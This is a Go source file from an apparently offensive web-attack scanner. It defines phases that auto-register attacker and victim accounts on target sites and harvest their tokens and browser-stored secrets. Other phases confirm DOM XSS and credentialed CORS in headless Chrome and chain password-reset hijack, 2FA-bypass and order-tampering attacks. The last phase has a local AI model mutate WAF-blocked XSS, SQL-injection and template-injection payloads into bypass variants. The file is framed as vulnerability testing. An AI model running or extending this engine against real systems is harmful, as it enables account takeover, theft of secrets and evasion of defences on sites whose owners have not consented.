package phases

// phases_sovereign.go — MOHAMMED V10.0 SOVEREIGN master orchestration.
//
// V9 delivered the adaptive stealth/WAF/Burp intelligence layer (Phase 54). V10
// adds the four SOVEREIGN autonomous capabilities from the mandate, wired as
// phases 55-60 so the total phase count crosses 60+:
//
//   Phase 55  Sovereign Orchestration     — prime the AI brain + CDP browser,
//                                            report the zero-touch posture.
//   Phase 56  Autonomous Account Bootstrap — discover signup, auto-register
//                                            User A/B, harvest tokens, feed BOLA.
//   Phase 57  DOM XSS & postMessage        — real headless-Chrome execution proof.
//   Phase 58  Client-Side Secret & CORS    — localStorage/sessionStorage secret
//                                            harvest + in-browser credentialed CORS.
//   Phase 59  Stateful Attack Graph        — chained 3-5 step state machines
//                                            (reset hijack / verify bypass / order tamper).
//   Phase 60  AI Payload Mutation          — feed WAF-blocked payloads to the
//                                            local brain for real-time bypass variants.
//
// Every phase FAILS OPEN: if Ollama or Chromium is unavailable the phase logs a
// clean skip and the scan proceeds on the deterministic/HTTP path. Findings that
// carry HARD PROOF (real DOM execution, deterministic state change, cross-user
// data) are stored through the same 5-gate discipline as the rest of the engine.

import (
	"context"
	"fmt"
	"strings"

	"github.com/mohammed-v3/core/pkg/browser"
	"github.com/mohammed-v3/core/pkg/engine"
	"github.com/mohammed-v3/core/pkg/exploit"
	"github.com/mohammed-v3/core/pkg/filter"
	"github.com/mohammed-v3/core/pkg/validation"
)

// SovereignPhases returns the ordered V10.0 sovereign phases (55-60).
func SovereignPhases() []engine.Phase {
	return []engine.Phase{
		&SovereignOrchestrationPhase{},
		&AutonomousBootstrapPhase{},
		&DOMXSSPhase{},
		&ClientSideSecretPhase{},
		&StatefulAttackGraphPhase{},
		&AIPayloadMutationPhase{},
	}
}

// bootstrappedIdentities carries the auto-registered User A/B across phases in a
// single scan. Populated by AutonomousBootstrapPhase (56), consumed by the BOLA
// and stateful phases. Guarded by the caller's single-threaded phase execution.
type bootstrappedIdentities struct {
	userA   exploit.Identity
	userB   exploit.Identity
	origin  string
	present bool
}

// sovereignBootstrap is the per-run shared bootstrap result. It is a package
// var (one scan per process) mirroring the existing stealthGov singleton style.
var sovereignBootstrap bootstrappedIdentities

// ─────────────────────────────────────────────────────────────────────────
// Phase 55 — Sovereign Orchestration
// ─────────────────────────────────────────────────────────────────────────

type SovereignOrchestrationPhase struct{}

func (p *SovereignOrchestrationPhase) Name() string { return "Sovereign Orchestration" }
func (p *SovereignOrchestrationPhase) Description() string {
	return "Phase 55: prime local AI cognitive brain + headless-Chrome CDP engine, report zero-touch sovereign posture"
}
func (p *SovereignOrchestrationPhase) Execute(ctx context.Context, s *engine.State) error {
	brain := "disabled"
	if s.Brain != nil && s.Brain.Online {
		brain = "ONLINE model=" + s.Brain.ActiveModel()
	} else if s.Brain != nil && s.Brain.Client != nil && s.Brain.Client.Enabled {
		brain = "offline (deterministic fail-open heuristics active)"
	}
	cdp := "unavailable (HTTP-only fallback)"
	if s.BrowserOnline {
		cdp = "ONLINE (headless Chromium)"
	}
	s.Printf("│  Sovereign posture: AI-Brain=%s | CDP-Browser=%s\n", brain, cdp)
	s.Printf("│  Zero-touch mode: signup auto-discovery + User A/B bootstrap + chained state machines armed\n")
	s.Printf("│  Zero-FP proof gates: (a) AI semantic triage OR (b) headless-Chrome DOM proof OR (c) deterministic state-change/OOB\n")
	return nil
}

// ─────────────────────────────────────────────────────────────────────────
// Phase 56 — Autonomous Account Bootstrapper
// ─────────────────────────────────────────────────────────────────────────

type AutonomousBootstrapPhase struct{}

func (p *AutonomousBootstrapPhase) Name() string { return "Autonomous Account Bootstrap" }
func (p *AutonomousBootstrapPhase) Description() string {
	return "Phase 56: auto-discover signup, register User A (victim) & User B (attacker), harvest tokens, feed BOLA — zero manual cookies"
}
func (p *AutonomousBootstrapPhase) Execute(ctx context.Context, s *engine.State) error {
	a := newAdvCtx(s)
	origins := apexLiveOrigins(s)
	if len(origins) == 0 {
		s.Printf("│  Account Bootstrap: SKIP (no in-scope live origins)\n")
		return nil
	}
	ab := exploit.NewAutoBootstrapper(a.client)
	for _, origin := range budget(origins, 8) {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		if s.IsWAFProtected(origin) && !(s.Config != nil && s.Config.WAFBypass) {
			continue
		}
		res := ab.BootstrapDualAccounts(ctx, origin)
		if res.Bootstrapped {
			sovereignBootstrap = bootstrappedIdentities{
				userA: res.UserA, userB: res.UserB, origin: origin, present: true,
			}
			s.Printf("│  ✓ Bootstrapped User A (%s) + User B (%s) at %s — tokens harvested, feeding BOLA/stateful engines\n",
				res.UserA.Username, res.UserB.Username, res.SignupURL)
			// Record a low-noise Info finding documenting autonomous session
			// acquisition (evidence for the report; not a vulnerability itself).
			s.AddFinding(map[string]interface{}{
				"type":     "Autonomous Session Bootstrap",
				"severity": "Info",
				"url":      res.SignupURL,
				"target":   filter.HostOf(res.SignupURL),
				"evidence": res.Evidence,
				"phase":    "V10-sovereign",
			})
			return nil
		}
	}
	s.Printf("│  Account Bootstrap: no auto-registerable signup surface found (BOLA falls back to config/unauth contexts)\n")
	return nil
}

// bootstrappedAuthContexts returns the auto-harvested (privileged, standard)
// auth contexts when Phase 56 succeeded, else two empty contexts. Consumed by
// the BOLA-style and stateful phases so they run fully zero-touch.
func bootstrappedAuthContexts() (priv exploit.AuthContext, std exploit.AuthContext, ok bool) {
	if !sovereignBootstrap.present {
		return exploit.AuthContext{}, exploit.AuthContext{}, false
	}
	return sovereignBootstrap.userA.AuthContext(), sovereignBootstrap.userB.AuthContext(), true
}

// ─────────────────────────────────────────────────────────────────────────
// Phase 57 — DOM XSS & postMessage (headless Chrome)
// ─────────────────────────────────────────────────────────────────────────

type DOMXSSPhase struct{}

func (p *DOMXSSPhase) Name() string { return "DOM XSS & postMessage" }
func (p *DOMXSSPhase) Description() string {
	return "Phase 57: headless-Chrome client-side XSS — inject canaries into #fragment/query/postMessage and confirm real in-DOM execution"
}
func (p *DOMXSSPhase) Execute(ctx context.Context, s *engine.State) error {
	if !s.BrowserOnline || s.Browser == nil {
		s.Printf("│  DOM XSS: SKIP (headless Chrome unavailable — HTTP reflected-XSS phase still covers server-side)\n")
		return nil
	}
	a := newAdvCtx(s)
	if len(a.urls) == 0 {
		s.Printf("│  DOM XSS: SKIP (no in-scope URLs)\n")
		return nil
	}
	scanner := exploit.NewDOMScanner(s.Browser)
	kept := 0
	skippedCDP := 0
	for _, u := range budget(a.urls, 30) {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		// V11.0 FLAW #5: skip CDP DOM analysis on origins Phase 0 classified as
		// REST-API/Backend (no meaningful DOM) so the CDP budget is spent on
		// the WebApp/SPA origins that actually have client-side attack surface.
		if ShouldSkipCDPFor(originString(u)) {
			skippedCDP++
			continue
		}
		release, ok := s.AcquireBrowserSlot(ctx)
		if !ok {
			return nil
		}
		findings, skipped := scanner.Scan(ctx, u)
		release()
		if skipped {
			s.Printf("│  DOM XSS: CDP became unavailable mid-scan — stopping client-side audit\n")
			return nil
		}
		for _, f := range findings {
			c := validation.Candidate{
				Type:                   "dom-xss",
				URL:                    f.URL,
				Evidence:               f.Evidence,
				RequiresExploitability: true,
				Exploitable:            true,
				SkipReproduce:          true, // proof is the live DOM execution itself
			}
			if a.storeCandidate(ctx, s, c, "DOM XSS (Headless Chrome Proof)", "High", map[string]interface{}{
				"sink":         f.Sink,
				"vector":       f.Vector,
				"marker":       f.Marker,
				"proof_engine": "go-rod CDP",
			}) {
				kept++
			}
		}
	}
	s.Printf("│  DOM XSS & postMessage: %d confirmed (real headless-Chrome execution proof)", kept)
	if skippedCDP > 0 {
		s.Printf(" | %d URL(s) skipped by Phase-0 classifier (REST/Backend — no DOM)", skippedCDP)
	}
	s.Printf("\n")
	return nil
}

// ─────────────────────────────────────────────────────────────────────────
// Phase 58 — Client-Side Secret Harvest & In-Browser CORS
// ─────────────────────────────────────────────────────────────────────────

type ClientSideSecretPhase struct{}

func (p *ClientSideSecretPhase) Name() string { return "Client-Side Secret & CORS" }
func (p *ClientSideSecretPhase) Description() string {
	return "Phase 58: headless-Chrome localStorage/sessionStorage secret harvest + in-browser credentialed CORS confirmation"
}
func (p *ClientSideSecretPhase) Execute(ctx context.Context, s *engine.State) error {
	if !s.BrowserOnline || s.Browser == nil {
		s.Printf("│  Client-Side Secret/CORS: SKIP (headless Chrome unavailable)\n")
		return nil
	}
	a := newAdvCtx(s)
	if len(a.urls) == 0 {
		s.Printf("│  Client-Side Secret/CORS: SKIP (no in-scope URLs)\n")
		return nil
	}
	scanner := exploit.NewDOMScanner(s.Browser)
	secretsKept, corsKept := 0, 0

	for _, u := range budget(a.urls, 20) {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		release, ok := s.AcquireBrowserSlot(ctx)
		if !ok {
			return nil
		}
		secrets, skipped := scanner.HarvestStorageSecrets(ctx, u)
		release()
		if skipped {
			break
		}
		for _, sec := range secrets {
			evidence := fmt.Sprintf("%s[%s] = %s (%s)", sec.Store, sec.Key, browser.Redact(sec.Value), sec.Reason)
			c := validation.Candidate{
				Type:                "client-storage-secret",
				URL:                 u,
				Evidence:            evidence,
				RequiresPrivateData: true,
				Exploitable:         true,
				SkipReproduce:       true,
			}
			if a.storeCandidate(ctx, s, c, "Client-Side Storage Secret", "Medium", map[string]interface{}{
				"store":        sec.Store,
				"storage_key":  sec.Key,
				"proof_engine": "go-rod CDP",
			}) {
				secretsKept++
			}
		}
	}

	// In-browser credentialed CORS confirmation: from each trusted origin, fetch
	// its own API paths cross-origin WITH credentials. A returned body is proof.
	origins := apexLiveOrigins(s)
	apis := apiCandidates(a.urls)
	for _, origin := range budget(origins, 5) {
		for _, api := range budget(apis, 6) {
			select {
			case <-ctx.Done():
				return nil
			default:
			}
			if sameOrigin(origin, api) {
				continue
			}
			release, ok := s.AcquireBrowserSlot(ctx)
			if !ok {
				return nil
			}
			proof, skipped := scanner.VerifyCORSInBrowser(ctx, origin, api)
			release()
			if skipped {
				break
			}
			if !proof.Allowed {
				continue
			}
			c := validation.Candidate{
				Type:                   "cors-credentialed",
				URL:                    api,
				Evidence:               fmt.Sprintf("in-browser credentialed cross-origin fetch from %s returned %d with body sample %q → CORS allows credentialed cross-origin read", origin, proof.Status, browser.Redact(proof.BodySample)),
				RequiresExploitability: true,
				Exploitable:            true,
				SkipReproduce:          true,
			}
			if a.storeCandidate(ctx, s, c, "CORS Misconfiguration (In-Browser Proof)", "High", map[string]interface{}{
				"trusted_origin": origin,
				"status":         proof.Status,
				"proof_engine":   "go-rod CDP withCredentials",
			}) {
				corsKept++
			}
		}
	}
	s.Printf("│  Client-Side Secret/CORS: %d storage secrets, %d credentialed-CORS confirmed\n", secretsKept, corsKept)
	return nil
}

// ─────────────────────────────────────────────────────────────────────────
// Phase 59 — Stateful Attack Graph
// ─────────────────────────────────────────────────────────────────────────

type StatefulAttackGraphPhase struct{}

func (p *StatefulAttackGraphPhase) Name() string { return "Stateful Attack Graph" }
func (p *StatefulAttackGraphPhase) Description() string {
	return "Phase 59: chained multi-step state machines — password-reset hijack, email-verification bypass, order-state manipulation"
}
func (p *StatefulAttackGraphPhase) Execute(ctx context.Context, s *engine.State) error {
	a := newAdvCtx(s)
	origins := apexLiveOrigins(s)
	if len(origins) == 0 {
		s.Printf("│  Stateful Attack Graph: SKIP (no in-scope origins)\n")
		return nil
	}
	eng := exploit.NewStateEngine(a.client)
	priv, _, haveBootstrap := bootstrappedAuthContexts()
	kept := 0

	for _, origin := range budget(origins, 5) {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		if s.IsWAFProtected(origin) && !(s.Config != nil && s.Config.WAFBypass) {
			continue
		}

		var machines []exploit.StateMachine
		// SM1: password-reset hijack against the bootstrapped victim (User A) or
		// a synthesized victim email when no bootstrap happened.
		victim := "victim@example-mohammed.test"
		if haveBootstrap && sovereignBootstrap.userA.Email != "" {
			victim = sovereignBootstrap.userA.Email
		}
		machines = append(machines, exploit.PasswordResetHijack(origin, victim))
		// SM2: email-verification bypass using the bootstrapped attacker session
		// (or an empty identity → unauthenticated attempt).
		machines = append(machines, exploit.EmailVerificationBypass(origin, sovereignBootstrap.userB))
		// SM3: order-state manipulation as the authenticated attacker.
		machines = append(machines, exploit.OrderStateManipulation(origin, priv))

		// V11.0 FINAL SOVEREIGN (FLAW #6): the FIVE new stateful chains — SM4
		// 2FA-bypass, SM5 forgot-password token reuse, SM6 OAuth code
		// interception, SM7 paginated IDOR, SM8 privilege-escalation via
		// parameter pollution — bringing the total to EIGHT full attack graphs.
		attackerEmail := "attacker@example-mohammed.test"
		if haveBootstrap && sovereignBootstrap.userB.Email != "" {
			attackerEmail = sovereignBootstrap.userB.Email
		}
		_, std, _ := bootstrappedAuthContexts()
		machines = append(machines, exploit.AllV11StateMachines(
			origin,
			sovereignBootstrap.userB, // attacker identity
			sovereignBootstrap.userA, // victim identity
			priv,                     // User A auth context
			std,                      // User B auth context
		)...)
		_ = attackerEmail

		for _, sm := range machines {
			res := eng.Run(ctx, sm, exploit.StateBag{})
			if !res.Exploited {
				continue
			}
			c := validation.Candidate{
				Type:                   "stateful-logic",
				URL:                    origin,
				Evidence:               fmt.Sprintf("%s: %s (steps %d/%d)", res.Name, res.Evidence, res.StepsOK, res.StepsRun),
				RequiresExploitability: true,
				Exploitable:            true,
				SkipReproduce:          true, // stateful chain already proven end-to-end
			}
			if a.storeCandidate(ctx, s, c, "Stateful Business-Logic Chain: "+res.Name, "High", map[string]interface{}{
				"steps_run":    res.StepsRun,
				"steps_ok":     res.StepsOK,
				"chain":        res.Name,
				"proof_engine": "state-machine",
			}) {
				kept++
			}
		}
	}
	s.Printf("│  Stateful Attack Graph: %d confirmed multi-step chains\n", kept)
	return nil
}

// ─────────────────────────────────────────────────────────────────────────
// Phase 60 — AI Payload Mutation (WAF bypass)
// ─────────────────────────────────────────────────────────────────────────

type AIPayloadMutationPhase struct{}

func (p *AIPayloadMutationPhase) Name() string { return "AI Payload Mutation" }
func (p *AIPayloadMutationPhase) Description() string {
	return "Phase 60: feed WAF-blocked payloads to the local Ollama brain for real-time bypass-variant generation and re-test"
}
func (p *AIPayloadMutationPhase) Execute(ctx context.Context, s *engine.State) error {
	a := newAdvCtx(s)
	origins := apexLiveOrigins(s)
	// Only meaningful where a WAF actually blocked us; otherwise it is a no-op.
	wafHosts := make([]string, 0)
	for _, o := range origins {
		if s.IsWAFProtected(o) {
			wafHosts = append(wafHosts, o)
		}
	}
	if len(wafHosts) == 0 {
		s.Printf("│  AI Payload Mutation: SKIP (no WAF-blocked hosts to bypass)\n")
		return nil
	}

	brainOnline := s.Brain != nil && s.Brain.Online
	source := "local Ollama brain"
	if !brainOnline {
		source = "deterministic offline mutations (brain offline)"
	}

	// A representative blocked payload per class; the brain (or offline fallback)
	// mutates each, then we re-probe a WAF host to see whether a variant slips
	// past the block. A distinct, non-block response is the proof gate.
	seeds := map[string]string{
		"xss":  `<script>alert(1)</script>`,
		"sqli": `' OR '1'='1`,
		"ssti": `{{7*7}}`,
	}
	kept := 0
	for _, origin := range budget(wafHosts, 3) {
		for class, payload := range seeds {
			select {
			case <-ctx.Done():
				return nil
			default:
			}
			// Capture the current WAF block response as context for the brain.
			block := a.client.Get(ctx, origin+"/?q="+payload)
			variants := s.Brain.MutatePayload(ctx, class, payload, block.Body)
			if len(variants) == 0 {
				continue
			}
			for _, v := range budget(variants, 4) {
				probe := a.client.Get(ctx, origin+"/?q="+v)
				// Bypass proof: the mutated variant is NOT met with the same WAF
				// block signal (403/406/429 or challenge body) that the original hit.
				if !looksBlocked(block) || looksBlocked(probe) {
					continue
				}
				c := validation.Candidate{
					Type:                   "waf-bypass",
					URL:                    origin,
					Evidence:               fmt.Sprintf("WAF blocked %q (HTTP %d) but %s-mutated variant %q returned HTTP %d (block bypassed via %s)", payload, block.Status, class, v, probe.Status, source),
					RequiresExploitability: true,
					Exploitable:            true,
					SkipReproduce:          true,
				}
				if a.storeCandidate(ctx, s, c, "AI-Assisted WAF Bypass", "Medium", map[string]interface{}{
					"class":         class,
					"original":      payload,
					"variant":       v,
					"mutation_src":  source,
					"proof_engine":  "ai-brain",
				}) {
					kept++
				}
				break // one confirmed bypass per class/host is enough
			}
		}
	}
	s.Printf("│  AI Payload Mutation: %d WAF bypasses confirmed via %s\n", kept, source)
	return nil
}

// looksBlocked reports whether a response is a WAF block/challenge.
func looksBlocked(r exploit.Response) bool {
	if r.Err != nil {
		return true
	}
	if r.Status == 403 || r.Status == 406 || r.Status == 429 {
		return true
	}
	b := strings.ToLower(r.Body)
	for _, sig := range []string{"just a moment", "attention required", "request blocked", "access denied", "cloudflare", "incapsula"} {
		if strings.Contains(b, sig) {
			return true
		}
	}
	return false
}

// sameOrigin reports whether two URLs share scheme://host[:port].
func sameOrigin(a, b string) bool {
	return originString(a) == originString(b)
}
